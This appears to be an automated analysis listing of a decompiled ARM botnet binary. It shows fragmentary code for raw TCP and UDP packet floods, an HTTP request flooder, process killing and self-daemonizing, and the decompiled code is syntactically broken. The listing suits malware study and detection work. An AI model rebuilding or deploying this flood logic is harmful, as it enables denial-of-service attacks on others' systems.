        result = close(sock_fd);
            while (true) {
                while (true) {
                    int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xc6e4
                    fd = sock_fd2;
                    if (sock_fd2 == -1) {
                        fcntl(sock_fd2, F_GETFL);
                        connect(fd, (struct sockaddr *)&addr, 16);
                        while (true) {
                            int32_t v373 = recvfrom(sock_fd, &buf, 256, MSG_NOSIGNAL, (struct sockaddr *)&addr2, &addr_len); // 0xc84c
                                                close(fd);
                                            while (true) {
                                                sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
                                                v377 = sock_fd2 == -1;
                                                fd = sock_fd2;
                                                if (sock_fd2 == -1) {
                                            int32_t v386 = close(fd2); // 0xc8cc
                        close(fd);
                    while (true) {
        while (true) {
                sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(24 * option_value + a2), 16);
            sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(24 * option_value + a2), 16);
=================FUNCTION : function_dbb4 ===================
++++++++ FUNCTION START 29536
++++++++ FUNCTION END 30032
++++++++ FUNCTION LENGTH 496
    struct sockaddr * v177;
        while (true) {
            int32_t sock_fd = socket(AF_INET, 17, IPPROTO_UDP); // 0xdd04
            if (sock_fd == -1) {
                return sock_fd;
            bind(sock_fd, (struct sockaddr *)&addr, 16);
            int32_t sock; // 0xdda8
            connect(sock, (struct sockaddr *)addr2, 16);
            while (true) {
                while (true) {
                        int32_t sock2; // 0xde20
                        send(sock2, (int32_t *)buf, length, MSG_NOSIGNAL);
                            send(sock2, (int32_t *)buf, length, MSG_NOSIGNAL);
                        int32_t sock3; // 0xde74
                        send(sock3, (int32_t *)buf2, length, MSG_NOSIGNAL);
                            send(sock3, (int32_t *)buf2, length, MSG_NOSIGNAL);
                    while (true) {
                    while (true) {
        while (true) {
        while (true) {
    while (true) {
=================FUNCTION : function_d470 ===================
++++++++ FUNCTION START 28904
++++++++ FUNCTION END 29533
++++++++ FUNCTION LENGTH 629
    struct sockaddr * v176;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xd638
    int32_t fd = sock_fd; // sb
    if (sock_fd == -1) {
        return sock_fd;
    if (setsockopt(SOL_IP, SO_TYPE, option_name, &option_value, (int32_t)&option_len) == -1) {
        return close(fd);
        while (true) {
        while (true) {
            while (true) {
            while (true) {
                                            sendto(fd, (int32_t *)message, 60, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
                                        sendto(fd, (int32_t *)message, 60, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
    while (true) {
=================FUNCTION : function_ae30 ===================
++++++++ FUNCTION START 23949
++++++++ FUNCTION END 24717
++++++++ FUNCTION LENGTH 768
    struct sockaddr * v177;
        while (true) {
                                        while (true) {
                                                free((int32_t *)v360);
                                            free((int32_t *)v360);
                                free((int32_t *)v360);
                            free((int32_t *)v360);
                    free((int32_t *)v360);
                free((int32_t *)v360);
                            while (true) {
                    free((int32_t *)v360);
                free((int32_t *)v360);
        free((int32_t *)v360);
    free((int32_t *)v360);
=================FUNCTION : function_b084 ===================
++++++++ FUNCTION START 24720
++++++++ FUNCTION END 25212
++++++++ FUNCTION LENGTH 492
    struct sockaddr * v175;
                    kill(9, SIGKILL);
                            kill(9, SIGKILL);
                                    kill(9, SIGKILL);
                                kill(9, SIGKILL);
                                kill(9, SIGKILL);
                                    kill(9, SIGKILL);
                                    kill(9, SIGKILL);
                                    kill(9, SIGKILL);
                        kill(9, SIGKILL);
                kill(9, SIGKILL);
        kill(9, SIGKILL);
    kill(9, SIGKILL);
=================FUNCTION : function_de9c ===================
++++++++ FUNCTION START 30035
++++++++ FUNCTION END 30643
++++++++ FUNCTION LENGTH 608
    struct sockaddr * v176;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); // 0xdfd8
    if (sock_fd == -1) {
        return sock_fd;
    if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
        return close(sock_fd);
            while (true) {
                while (true) {
                while (true) {
                                        sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(a2 + 24 * option_value), 16);
                                    sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(a2 + 24 * option_value), 16);
            while (true) {
    while (true) {
=================FUNCTION : function_e528 ===================
++++++++ FUNCTION START 30646
++++++++ FUNCTION END 31176
++++++++ FUNCTION LENGTH 530
    struct sockaddr * v177;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); // 0xe628
    int32_t fd = sock_fd; // fp
    if (sock_fd == -1) {
        return sock_fd;
    if (setsockopt(SOL_IP, SO_TYPE, option_name, &option_value, (int32_t)&option_len) == -1) {
        return close(fd);
        while (true) {
        while (true) {
            while (true) {
            while (true) {
                                sendto(fd, (int32_t *)message, v350 + 32, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
    while (true) {
=================FUNCTION : function_ccfc ===================
++++++++ FUNCTION START 28256
++++++++ FUNCTION END 28901
++++++++ FUNCTION LENGTH 645
    struct sockaddr * v176;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xcf00
    if (sock_fd == -1) {
        return sock_fd;
    if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
        return close(sock_fd);
        while (true) {
    while (true) {
        while (true) {
        while (true) {
                                        sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
                                    sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
        while (true) {
=================FUNCTION : function_b5e8 ===================
++++++++ FUNCTION START 26395
++++++++ FUNCTION END 26993
++++++++ FUNCTION LENGTH 598
    struct sockaddr * v176;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xb73c
    if (sock_fd == -1) {
        return sock_fd;
    if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
        return close(sock_fd);
        while (true) {
    while (true) {
        while (true) {
        while (true) {
                                    sendto(sock_fd, (int32_t *)message, v350 + 66, MSG_NOSIGNAL, (struct sockaddr *)(a2 + 24 * option_value), 16);
        while (true) {
=================FUNCTION : function_bd64 ===================
++++++++ FUNCTION START 26996
++++++++ FUNCTION END 27586
++++++++ FUNCTION LENGTH 590
    struct sockaddr * v176;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xbeb8
    if (sock_fd == -1) {
        return sock_fd;
    if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
        return close(sock_fd);
        while (true) {
    while (true) {
        while (true) {
        while (true) {
                                    sendto(sock_fd, (int32_t *)message, v350 + 52, MSG_NOSIGNAL, (struct sockaddr *)(a2 + 24 * option_value), 16);
        while (true) {
=================FUNCTION : function_1002c ===================
++++++++ FUNCTION START 36123
++++++++ FUNCTION END 36514
++++++++ FUNCTION LENGTH 391
    struct sockaddr * v175;
    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x10048
    int32_t fd = sock_fd;
    if (sock_fd == -1) {
        return sock_fd;
    setsockopt(sock_fd, SO_DEBUG, 2, &option_value, 4);
    fcntl(fd, F_GETFL);
    if (bind(fd, (struct sockaddr *)&addr, 16) == -1) {
        connect(fd, (struct sockaddr *)&addr, 16);
        close(fd);
        result = listen(fd, 1);
=================FUNCTION : function_13748 ===================
++++++++ FUNCTION START 48884
++++++++ FUNCTION END 49434
++++++++ FUNCTION LENGTH 550
    struct sockaddr * v177;
                while (true) {
                        while (true) {
                            while (true) {
                while (true) {
                    while (true) {
        while (true) {
    while (true) {
=================FUNCTION : function_1350c ===================
++++++++ FUNCTION START 47010
++++++++ FUNCTION END 47374
++++++++ FUNCTION LENGTH 364
    struct sockaddr * v177;
    int32_t sock_fd = socket(AF_INET, 0, IPPROTO_IP); // 0x13534
    if (sock_fd != -1) {
        int32_t sock = 2; // bp-40
        connect((int32_t)&sock, (struct sockaddr *)addr, addr);
        getsockname(sock_fd, (struct sockaddr *)&sock, &addr_len);
        close(sock_fd);
=================FUNCTION : function_10bf4 ===================
++++++++ FUNCTION START 37849
++++++++ FUNCTION END 38199
++++++++ FUNCTION LENGTH 350
    struct sockaddr * v173;
    int32_t pid = getpid(); // 0x10c08
    int32_t v343 = pid ^ getppid();
    int32_t proc_time = clock(); // 0x10c20
    int32_t v344 = v343 ^ proc_time;
    int32_t v345 = proc_time;
    return proc_time;
=================FUNCTION : function_ad40 ===================
++++++++ FUNCTION START 23539
++++++++ FUNCTION END 23946
++++++++ FUNCTION LENGTH 407
    struct sockaddr * v176;
    int32_t result = fork(); // 0xad58
            int32_t status2 = fork(); // 0xad7c
                kill(getppid(), SIGKILL);
                while (true) {
=================FUNCTION : function_10e70 ===================
++++++++ FUNCTION START 39359
++++++++ FUNCTION END 39729
++++++++ FUNCTION LENGTH 370
    struct sockaddr * v177;
    if (socket(AF_INET, SOCK_STREAM, IPPROTO_IP) == -1) {
        fcntl(fd, F_GETFL);
        int32_t sock; // 0x10f10
        result = connect(sock, (struct sockaddr *)&addr, 16);
=================FUNCTION : __modsi3 ===================
++++++++ FUNCTION START 51249
++++++++ FUNCTION END 52061
++++++++ FUNCTION LENGTH 812
    struct sockaddr * v177;
            while (true) {
                        while (true) {
                                while (true) {
                    while (true) {
=================FUNCTION : __udivsi3 ===================
++++++++ FUNCTION START 49437
++++++++ FUNCTION END 50144
++++++++ FUNCTION LENGTH 707
    struct sockaddr * v177;
    while (true) {
                                while (true) {
                                    while (true) {
                while (true) {
=================FUNCTION : function_136b8 ===================
++++++++ FUNCTION START 48320
++++++++ FUNCTION END 48881
++++++++ FUNCTION LENGTH 561
    struct sockaddr * v177;
                while (true) {
            while (true) {
            while (true) {
        while (true) {
=================FUNCTION : function_13634 ===================
++++++++ FUNCTION START 47823
++++++++ FUNCTION END 48317
++++++++ FUNCTION LENGTH 494
    struct sockaddr * v177;
                while (true) {
            while (true) {
            while (true) {
    while (true) {
=================FUNCTION : __umodsi3 ===================
++++++++ FUNCTION START 50499
++++++++ FUNCTION END 51246
++++++++ FUNCTION LENGTH 747
    struct sockaddr * v177;
            while (true) {
                        while (true) {
                                while (true) {
                    while (true) {
=================FUNCTION : function_b1d4 ===================
++++++++ FUNCTION START 25215
++++++++ FUNCTION END 25606
++++++++ FUNCTION LENGTH 391
    struct sockaddr * v177;
            return inet_addr((char *)cp);
    while (true) {
        return inet_addr((char *)cp);
=================FUNCTION : function_13380 ===================
++++++++ FUNCTION START 46046
++++++++ FUNCTION END 46627
++++++++ FUNCTION LENGTH 581
    struct sockaddr * v177;
    while (true) {
    while (true) {
    while (true) {
=================FUNCTION : function_1327c ===================
++++++++ FUNCTION START 44530
++++++++ FUNCTION END 44933
++++++++ FUNCTION LENGTH 403
    struct sockaddr * v177;
            while (true) {
    while (true) {
=================FUNCTION : function_135a8 ===================
++++++++ FUNCTION START 47377
++++++++ FUNCTION END 47820
++++++++ FUNCTION LENGTH 443
    struct sockaddr * v177;
        while (true) {
    while (true) {
=================FUNCTION : function_10c50 ===================
++++++++ FUNCTION START 38202
++++++++ FUNCTION END 38600
++++++++ FUNCTION LENGTH 398
    struct sockaddr * v174;
    int32_t * dest_mem = memcpy(&v344, (int32_t *)"abcdefghijklmnopqrstuvw012345678", 33); // 0x10c6c
    while (true) {
=================FUNCTION : _sigprocmask ===================
++++++++ FUNCTION START 18497
++++++++ FUNCTION END 18846
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return sigprocmask(how, set, oset);
=================FUNCTION : _setsockopt ===================
++++++++ FUNCTION START 9696
++++++++ FUNCTION END 10045
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return setsockopt(fd, level, optname, optval, optlen);
=================FUNCTION : function_b240 ===================
++++++++ FUNCTION START 25609
++++++++ FUNCTION END 26000
++++++++ FUNCTION LENGTH 391
    struct sockaddr * v177;
    while (true) {
=================FUNCTION : _getsockname ===================
++++++++ FUNCTION START 18849
++++++++ FUNCTION END 19198
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return getsockname(fd, addr, len);
=================FUNCTION : _kill ===================
++++++++ FUNCTION START 8288
++++++++ FUNCTION END 8637
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return kill(pid, sig);
=================FUNCTION : function_13318 ===================
++++++++ FUNCTION START 45665
++++++++ FUNCTION END 46043
++++++++ FUNCTION LENGTH 378
    struct sockaddr * v177;
    while (true) {
=================FUNCTION : function_10d78 ===================
++++++++ FUNCTION START 38603
++++++++ FUNCTION END 38997
++++++++ FUNCTION LENGTH 394
    struct sockaddr * v173;
    while (true) {
=================FUNCTION : _closedir ===================
++++++++ FUNCTION START 16737
++++++++ FUNCTION END 17086
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return closedir(dirp);
=================FUNCTION : function_10e5c ===================
++++++++ FUNCTION START 39000
++++++++ FUNCTION END 39356
++++++++ FUNCTION LENGTH 356
    struct sockaddr * v177;
    int32_t result = kill(pid, SIGKILL); // 0x10e68
=================FUNCTION : _accept ===================
++++++++ FUNCTION START 7232
++++++++ FUNCTION END 7581
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return accept(fd, addr, addr_len);
=================FUNCTION : _sendto ===================
++++++++ FUNCTION START 11104
++++++++ FUNCTION END 11453
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return sendto(fd, buf, n, flags, addr, addr_len);
=================FUNCTION : _send ===================
++++++++ FUNCTION START 6527
++++++++ FUNCTION END 6876
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return send(fd, buf, n, flags);
=================FUNCTION : function_134ac ===================
++++++++ FUNCTION START 46630
++++++++ FUNCTION END 47007
++++++++ FUNCTION LENGTH 377
    struct sockaddr * v177;
    while (true) {
=================FUNCTION : _getsockopt ===================
++++++++ FUNCTION START 14272
++++++++ FUNCTION END 14621
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return getsockopt(fd, level, optname, optval, optlen);
=================FUNCTION : function_acdc ===================
++++++++ FUNCTION START 23155
++++++++ FUNCTION END 23536
++++++++ FUNCTION LENGTH 381
    struct sockaddr * v177;
    while (true) {
=================FUNCTION : _recvfrom ===================
++++++++ FUNCTION START 4767
++++++++ FUNCTION END 5116
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return recvfrom(fd, buf, n, flags, addr, addr_len);
=================FUNCTION : _close ===================
++++++++ FUNCTION START 17441
++++++++ FUNCTION END 17790
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return close(fd);
=================FUNCTION : _getpid ===================
++++++++ FUNCTION START 2655
++++++++ FUNCTION END 3004
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return getpid();
=================FUNCTION : _connect ===================
++++++++ FUNCTION START 1599
++++++++ FUNCTION END 1948
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return connect(fd, addr, len);
=================FUNCTION : _listen ===================
++++++++ FUNCTION START 11808
++++++++ FUNCTION END 12157
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return listen(fd, n);
=================FUNCTION : _getppid ===================
++++++++ FUNCTION START 13216
++++++++ FUNCTION END 13565
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return getppid();
=================FUNCTION : _recv ===================
++++++++ FUNCTION START 1247
++++++++ FUNCTION END 1596
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return recv(fd, buf, n, flags);
=================FUNCTION : _socket ===================
++++++++ FUNCTION START 5119
++++++++ FUNCTION END 5468
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return socket(domain, type, protocol);
=================FUNCTION : _open ===================
++++++++ FUNCTION START 15681
++++++++ FUNCTION END 16030
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return open(file, oflag);
=================FUNCTION : _fork ===================
++++++++ FUNCTION START 12160
++++++++ FUNCTION END 12509
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return fork();
=================FUNCTION : function_f2a8 ===================
++++++++ FUNCTION START 33060
++++++++ FUNCTION END 33416
++++++++ FUNCTION LENGTH 356
    struct sockaddr * v176;
    int32_t result = kill(pid, SIGKILL); // 0xf2b4
=================FUNCTION : _inet_addr ===================
++++++++ FUNCTION START 8992
++++++++ FUNCTION END 9341
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    return inet_addr(cp);
=================FUNCTION : _raise ===================
++++++++ FUNCTION START 17793
++++++++ FUNCTION END 18142
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : function_f1f8 ===================
++++++++ FUNCTION START 32638
++++++++ FUNCTION END 33057
++++++++ FUNCTION LENGTH 419
    struct sockaddr * v177;
=================FUNCTION : function_8ee0 ===================
++++++++ FUNCTION START 20290
++++++++ FUNCTION END 20640
++++++++ FUNCTION LENGTH 350
    struct sockaddr * v177;
=================FUNCTION : function_13b58 ===================
++++++++ FUNCTION START 52785
++++++++ FUNCTION END 53135
++++++++ FUNCTION LENGTH 350
    struct sockaddr * v177;
=================FUNCTION : _sigemptyset ===================
++++++++ FUNCTION START 1951
++++++++ FUNCTION END 2300
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : _write ===================
++++++++ FUNCTION START 7936
++++++++ FUNCTION END 8285
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : _chdir ===================
++++++++ FUNCTION START 9344
++++++++ FUNCTION END 9693
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : function_132f4 ===================
++++++++ FUNCTION START 45300
++++++++ FUNCTION END 45662
++++++++ FUNCTION LENGTH 362
    struct sockaddr * v177;
=================FUNCTION : _unlink ===================
++++++++ FUNCTION START 10752
++++++++ FUNCTION END 11101
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : function_13b24 ===================
++++++++ FUNCTION START 52417
++++++++ FUNCTION END 52782
++++++++ FUNCTION LENGTH 365
    struct sockaddr * v176;
=================FUNCTION : function_12a38 ===================
++++++++ FUNCTION START 43708
++++++++ FUNCTION END 44162
++++++++ FUNCTION LENGTH 454
    struct sockaddr * v146;
=================FUNCTION : function_13254 ===================
++++++++ FUNCTION START 44165
++++++++ FUNCTION END 44527
++++++++ FUNCTION LENGTH 362
    struct sockaddr * v177;
=================FUNCTION : function_ffd8 ===================
++++++++ FUNCTION START 35763
++++++++ FUNCTION END 36120
++++++++ FUNCTION LENGTH 357
    struct sockaddr * v177;
=================FUNCTION : _atoi ===================
++++++++ FUNCTION START 15329
++++++++ FUNCTION END 15678
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : function_12980 ===================
++++++++ FUNCTION START 43316
++++++++ FUNCTION END 43705
++++++++ FUNCTION LENGTH 389
    struct sockaddr * v176;
=================FUNCTION : __aeabi_uidivmod ===================
++++++++ FUNCTION START 50147
++++++++ FUNCTION END 50496
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : function_b2b0 ===================
++++++++ FUNCTION START 26003
++++++++ FUNCTION END 26392
++++++++ FUNCTION LENGTH 389
    struct sockaddr * v175;
=================FUNCTION : function_8e7c ===================
++++++++ FUNCTION START 19574
++++++++ FUNCTION END 19930
++++++++ FUNCTION LENGTH 356
    struct sockaddr * v177;
=================FUNCTION : __aeabi_ldiv0 ===================
++++++++ FUNCTION START 52064
++++++++ FUNCTION END 52414
++++++++ FUNCTION LENGTH 350
    struct sockaddr * v177;
=================FUNCTION : function_13b60 ===================
++++++++ FUNCTION START 53138
++++++++ FUNCTION END 53489
++++++++ FUNCTION LENGTH 351
    struct sockaddr * v177;
=================FUNCTION : function_8b6c ===================
++++++++ FUNCTION START 183
++++++++ FUNCTION END 533
++++++++ FUNCTION LENGTH 350
    struct sockaddr * v179 = NULL;
=================FUNCTION : function_132d0 ===================
++++++++ FUNCTION START 44936
++++++++ FUNCTION END 45297
++++++++ FUNCTION LENGTH 361
    struct sockaddr * v177;
=================FUNCTION : function_10b9c ===================
++++++++ FUNCTION START 37491
++++++++ FUNCTION END 37846
++++++++ FUNCTION LENGTH 355
    struct sockaddr * v173;
=================FUNCTION : _select ===================
++++++++ FUNCTION START 5471
++++++++ FUNCTION END 5820
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : * ===================
++++++++ FUNCTION START 14624
++++++++ FUNCTION END 14973
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
    struct sockaddr * v177;
    struct sockaddr * v177;
    struct sockaddr * v177;
    struct sockaddr * v177;
    struct sockaddr * v177;
    struct sockaddr * v177;
=================FUNCTION : function_10f44 ===================
++++++++ FUNCTION START 39732
++++++++ FUNCTION END 40134
++++++++ FUNCTION LENGTH 402
    struct sockaddr * v173;
=================FUNCTION : _sigaddset ===================
++++++++ FUNCTION START 6175
++++++++ FUNCTION END 6524
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : _setsid ===================
++++++++ FUNCTION START 16385
++++++++ FUNCTION END 16734
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : _readlink ===================
++++++++ FUNCTION START 3711
++++++++ FUNCTION END 4060
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : _sleep ===================
++++++++ FUNCTION START 4415
++++++++ FUNCTION END 4764
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : _bind ===================
++++++++ FUNCTION START 8640
++++++++ FUNCTION END 8989
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : __start ===================
++++++++ FUNCTION START 20643
++++++++ FUNCTION END 20996
++++++++ FUNCTION LENGTH 353
    struct sockaddr * v176;
=================FUNCTION : function_ffc0 ===================
++++++++ FUNCTION START 35410
++++++++ FUNCTION END 35760
++++++++ FUNCTION LENGTH 350
    struct sockaddr * v176;
=================FUNCTION : _clock ===================
++++++++ FUNCTION START 16033
++++++++ FUNCTION END 16382
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : function_8e88 ===================
++++++++ FUNCTION START 19933
++++++++ FUNCTION END 20287
++++++++ FUNCTION LENGTH 354
    struct sockaddr * v177;
=================FUNCTION : _fcntl ===================
++++++++ FUNCTION START 17089
++++++++ FUNCTION END 17438
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : function_1289c ===================
++++++++ FUNCTION START 42561
++++++++ FUNCTION END 42921
++++++++ FUNCTION LENGTH 360
    struct sockaddr * v177;
=================FUNCTION : function_8e08 ===================
++++++++ FUNCTION START 19201
++++++++ FUNCTION END 19571
++++++++ FUNCTION LENGTH 370
    struct sockaddr * v175;
=================FUNCTION : _prctl ===================
++++++++ FUNCTION START 3007
++++++++ FUNCTION END 3356
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : function_f19c ===================
++++++++ FUNCTION START 32247
++++++++ FUNCTION END 32635
++++++++ FUNCTION LENGTH 388
    struct sockaddr * v177;
=================FUNCTION : ___uClibc_main ===================
++++++++ FUNCTION START 12512
++++++++ FUNCTION END 12861
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : _read ===================
++++++++ FUNCTION START 10400
++++++++ FUNCTION END 10749
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : _ioctl ===================
++++++++ FUNCTION START 895
++++++++ FUNCTION END 1244
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
=================FUNCTION : __data_start ===================
++++++++ FUNCTION START 53492
++++++++ FUNCTION END 53847
++++++++ FUNCTION LENGTH 355
    struct sockaddr * v177;
=================FUNCTION : function_8b84 ===================
++++++++ FUNCTION START 536
++++++++ FUNCTION END 892
++++++++ FUNCTION LENGTH 356
    struct sockaddr * v176;
=================FUNCTION : function_128c8 ===================
++++++++ FUNCTION START 42924
++++++++ FUNCTION END 43313
++++++++ FUNCTION LENGTH 389
    struct sockaddr * v176;
=================FUNCTION : _time ===================
++++++++ FUNCTION START 13568
++++++++ FUNCTION END 13917
++++++++ FUNCTION LENGTH 349
    struct sockaddr * v177;
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 1 @ function_8f24 ====================================
++++++++ WHILE START : 21391 
++++++++ WHILE FUNCTION : function_8f24 
++++++++ WHILE END : 21955 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		int32_t sock_fd = socket(AF_INET, SOCK_STREAM, protocol); // 0x93ec
		dest_mem = sock_fd;
		fd = sock_fd;
		if (sock_fd != -1) {
		fcntl(dest_mem, F_GETFL);
		int32_t sock; // 0x942c
		setsockopt(sock, protocol, 8, &option_value, 4);
		int32_t sock2; // 0x945c
		connect(sock2, (struct sockaddr *)&addr, 16);
		function_1327c((char *)v415, (int32_t)" HTTP/1.1\r\nUser-Agent: ");
		function_1327c((char *)v417, (int32_t)"\r\nHost: ");
		int32_t sock3; // 0x9a28
		send(sock3, (int32_t *)buf, function_13254(v387), MSG_NOSIGNAL);
		close(fd2);
		close(fd3);
=============================WHILE LOOPS ID : 2 @ function_8f24 ====================================
++++++++ WHILE START : 21995 
++++++++ WHILE FUNCTION : function_8f24 
++++++++ WHILE END : 23138 
++++++++ INTRESTING INSTRUCTIONS :  
		uint32_t sock8; // 0x95b0
		if (sock8 != -1) {
		if ((v463 >> sock8 % 32) % 2 == 0) {
		v462 = sock8;
		int32_t sock4; // 0x9b3c
		int32_t v469 = recv(sock4, &buf2, 0x2800, MSG_PEEK | MSG_NOSIGNAL); // 0x9b48
		close(fd4);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (function_13318(t, v529, (int32_t)"http", 4) == 4) {
		while (true) {
		if (function_13634((char *)v543, (int32_t)"POST") == 0) {
		if (function_13634((char *)v543, (int32_t)"GET") == 0) {
		int32_t sock5; // 0xa658
		recv(sock5, &buf2, length, MSG_NOSIGNAL);
		if (function_135a8((char *)fd, function_13254((char *)v560), (int32_t)"url=") == -1) {
		int32_t v565 = option_value + function_135a8((char *)v564, function_13254((char *)v564), (int32_t)"url="); // 0xa554
		while (true) {
		if (function_135a8((char *)t, function_13254((char *)v572), (int32_t)"http") == 4) {
		while (true) {
		memcpy((int32_t *)(v345 + 1431), (int32_t *)"GET", 4);
		dest_mem = (int32_t)memcpy((int32_t *)v585, (int32_t *)"GET", 4);
		if (function_13634((char *)v543, (int32_t)"POST") == 0) {
		while (true) {
		while (true) {
		int32_t sock6; // 0xa194
		int32_t v591 = recv(sock6, (int32_t *)(v355 + v590), 1024 - v590, MSG_NOSIGNAL); // 0xa1a4
		close(fd5);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		int32_t sock7; // 0xa388
		int32_t v633 = recv(sock7, &buf2, 0x2800, MSG_NOSIGNAL); // 0xa394
		close(fd6);
		close(fd6);
		while (true) {
		int32_t v636 = option_value2 | getsockopt(sock8, SO_DEBUG, 4, &option_value2, &option_len); // 0x9624
		close(fd7);
=============================WHILE LOOPS ID : 6 @ function_ae30 ====================================
++++++++ WHILE START : 24359 
++++++++ WHILE FUNCTION : function_ae30 
++++++++ WHILE END : 24576 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		free((int32_t *)v360);
		free((int32_t *)v360);
		free((int32_t *)v360);
		free((int32_t *)v360);
		free((int32_t *)v360);
		free((int32_t *)v360);
=============================WHILE LOOPS ID : 11 @ function_b5e8 ====================================
++++++++ WHILE START : 26836 
++++++++ WHILE FUNCTION : function_b5e8 
++++++++ WHILE END : 26992 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		sendto(sock_fd, (int32_t *)message, v350 + 66, MSG_NOSIGNAL, (struct sockaddr *)(a2 + 24 * option_value), 16);
		while (true) {
=============================WHILE LOOPS ID : 13 @ function_bd64 ====================================
++++++++ WHILE START : 27432 
++++++++ WHILE FUNCTION : function_bd64 
++++++++ WHILE END : 27585 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		sendto(sock_fd, (int32_t *)message, v350 + 52, MSG_NOSIGNAL, (struct sockaddr *)(a2 + 24 * option_value), 16);
		while (true) {
=============================WHILE LOOPS ID : 14 @ function_c480 ====================================
++++++++ WHILE START : 27981 
++++++++ WHILE FUNCTION : function_c480 
++++++++ WHILE END : 28165 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xc6e4
		fd = sock_fd2;
		if (sock_fd2 == -1) {
		fcntl(sock_fd2, F_GETFL);
		connect(fd, (struct sockaddr *)&addr, 16);
		while (true) {
		int32_t v373 = recvfrom(sock_fd, &buf, 256, MSG_NOSIGNAL, (struct sockaddr *)&addr2, &addr_len); // 0xc84c
		close(fd);
		while (true) {
		sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
		v377 = sock_fd2 == -1;
		fd = sock_fd2;
		if (sock_fd2 == -1) {
		int32_t v386 = close(fd2); // 0xc8cc
		close(fd);
		while (true) {
=============================WHILE LOOPS ID : 15 @ function_c480 ====================================
++++++++ WHILE START : 28174 
++++++++ WHILE FUNCTION : function_c480 
++++++++ WHILE END : 28240 
++++++++ INTRESTING INSTRUCTIONS :  
